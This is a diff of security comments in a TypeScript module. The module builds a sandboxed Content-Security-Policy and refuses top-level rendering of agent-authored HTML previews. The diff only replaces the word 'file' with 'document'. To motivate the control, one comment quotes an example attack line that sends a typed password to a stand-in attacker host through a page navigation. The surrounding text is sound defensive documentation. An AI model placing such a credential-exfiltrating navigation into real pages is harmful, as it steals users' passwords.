@@ -202,7 +202,7 @@ interface PreviewCsp {
  * `localStorage` / `sessionStorage` / `document.cookie` throw `SecurityError`,
  * and `window.open` returns null. Tokens deliberately NOT granted:
  *
- *  - `allow-same-origin` — hands the file back a real origin and defeats the
+ *  - `allow-same-origin` — hands the document back a real origin and defeats the
  *    entire control.
  *  - `allow-popups` / `allow-popups-to-escape-sandbox` — a popup would be an
  *    attacker-controlled window opened from a hostname the user trusts.
@@ -211,17 +211,17 @@ interface PreviewCsp {
  *    activation" variant is worthless here because the attack IS a click.
  *
  * What the sandbox does NOT buy — measured, not assumed: it does not stop the
- * file navigating ITSELF. The sandboxed-top-level-navigation flags gate
+ * document navigating ITSELF. The sandboxed-top-level-navigation flags gate
  * navigating an ANCESTOR browsing context only; a sandboxed navigable may always
  * replace its own content, so `location = …`, `<meta http-equiv="refresh">` and
  * a plain `<a href>` click all succeed. That is why a top-level load is never
  * served as active HTML ({@link mayServeActiveHtml}) rather than served under a
- * stricter policy: loaded top-level the agent file IS the navigable, so it
+ * stricter policy: loaded top-level the agent document IS the navigable, so it
  * can be the fake login form itself and carry the typed-in credentials out in a
  * navigation URL — a channel no CSP directive covers.
  *
  * Where active HTML IS served — a nested frame, the SPA's preview modal — that
- * same self-navigation freedom means the agent file can replace its OWN
+ * same self-navigation freedom means the agent document can replace its OWN
  * frame. Nothing THIS policy carries can bound that; the control lives on the
  * PARENT document, whose CSP `frame-src` names the preview origin and nothing
  * else (`buildSpaCsp()` in `apps/api/src/routes/spa.ts`). Verified in Chrome
@@ -261,7 +261,7 @@ interface PreviewCsp {
  * embedder forgets the attribute.
  *
  * The `<meta>` copy omits `sandbox`, because the directive is IGNORED in a meta
- * context (per spec — a file cannot sandbox itself after parsing has begun).
+ * context (per spec — a document cannot sandbox itself after parsing has begun).
  * Leaving it there would be dead text that READS like a live control, and the
  * next reader "fixing" the divergence by collapsing the two strings into one
  * would silently disable the header's sandbox. The divergence therefore lives in
@@ -300,21 +300,21 @@ export function buildPreviewCsp(appOrigin: string): PreviewCsp {
  * instead of running it).
  *
  * The answer depends on the LOADING CONTEXT and on nothing else. Active HTML
- * requires a proven NESTED-file load (`Sec-Fetch-Dest: iframe`) — in EVERY
+ * requires a proven NESTED-document load (`Sec-Fetch-Dest: iframe`) — in EVERY
  * mode, whether or not `USERCONTENT_URL` is configured. There is no
  * separate-origin escape hatch, because a TOP-LEVEL render of an agent-authored
- * file cannot be contained by anything the response can carry:
+ * document cannot be contained by anything the response can carry:
  *
  *  - The CSP built by {@link buildPreviewCsp} blocks exfiltration (`connect-src`,
  *    `form-action`, `img-src`, `base-uri`) but NOT script execution itself —
  *    that is by design, the page has to render.
- *  - Its `sandbox allow-scripts` revokes the file's origin, but a sandboxed
+ *  - Its `sandbox allow-scripts` revokes the document's origin, but a sandboxed
  *    navigable may ALWAYS navigate ITSELF (the sandboxed-top-level-navigation
  *    flags only gate navigating an ANCESTOR). Verified in Chrome against a real
  *    server sending that header: on a top-level load `location = …`,
  *    `<meta http-equiv="refresh">` and a plain `<a href>` click all succeed.
  *  - So the attack is not "reach the app's session". It is that the agent
- *    file IS the fake login page, rendered top-level on a hostname the user
+ *    document IS the fake login page, rendered top-level on a hostname the user
  *    trusts, exfiltrating whatever is typed into it BY NAVIGATION
  *    (`location = "https://evil.example/?p=" + password`). No CSP directive
  *    covers that channel. Refusing the render is the only control that does.
@@ -329,12 +329,12 @@ export function buildPreviewCsp(appOrigin: string): PreviewCsp {
  *
  * `Sec-Fetch-Dest` is a browser-set, script-unforgeable header, so it is the
  * authoritative statement of the loading context, and the decision is
- * fail-CLOSED: a top-level navigation (`file`), a bare `fetch` (`empty`),
+ * fail-CLOSED: a top-level navigation (`document`), a bare `fetch` (`empty`),
  * an `object`/`embed` load, and a MISSING header (non-browser client, or a
  * browser too old to send it — Safari < 16.4) all degrade to inert source.
  * Degrading rather than erroring keeps the link useful: the holder of a valid
  * token may read the source, which it could download anyway — the bytes are
- * simply never parsed as a file.
+ * simply never parsed as a document.
  *
  * @param secFetchDest Raw `Sec-Fetch-Dest` request header, or null when absent.
  */
@@ -346,9 +346,9 @@ export function mayServeActiveHtml(secFetchDest: string | null): boolean {
  * Inject a `<meta http-equiv="Content-Security-Policy">` duplicating the CSP as
  * the FIRST child of `<head>`. A header alone can be bypassed on some
  * relative-URL / `srcdoc` paths; a parse-time meta CSP binds the policy to the
- * file itself, immovable by script. `frame-ancestors` is silently ignored in
+ * document itself, immovable by script. `frame-ancestors` is silently ignored in
  * a meta context (per spec) — harmless, and the response header still enforces
- * it. Creates a `<head>` (or the whole element) when the file lacks one.
+ * it. Creates a `<head>` (or the whole element) when the document lacks one.
  *
  * Buffer-and-transform (the caller reads the whole body first, bounded by
  * {@link PREVIEW_MAX_BYTES}) — correct and simple, versus fragile regex
